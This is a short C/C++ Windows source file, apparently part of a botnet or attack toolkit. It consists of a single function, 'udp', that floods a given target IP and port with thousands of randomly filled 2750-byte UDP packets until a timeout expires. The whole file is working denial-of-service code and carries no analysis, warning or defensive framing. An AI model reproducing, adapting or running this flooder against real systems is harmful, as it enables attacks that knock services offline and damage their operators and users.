#include "includes.h"
#include "externs.h"
#include "time.h"

void udp(char *target, char *port, char *timeout)
{
	unsigned short p = (unsigned short)atoi(port);
	//packets
	int t = 3500;
	//packet size
	int s = 2750;
	//delay (ms)
	int d = 15;
	//user entered time
	int tt = atoi(timeout);

	int skydelay = 100;
	SOCKADDR_IN ssin;
	SOCKET usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
   	IN_ADDR iaddr;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	
   	ssin.sin_port = htons(p);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int i;
	iaddr.s_addr = inet_addr(target);
	ssin.sin_addr = iaddr;
	i = 0;
	char *pbuff = new char [s];
	for (i = 0; i < s; i++) {
		pbuff[i] = (char)(rand() % 255);
	}
	int now = time(NULL);
	while (t-- > 0) {
			sendto(usock, pbuff, s-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(d);
			if ((int)time(NULL)-now>tt) { break; }
	}

	Sleep( 500 );
};
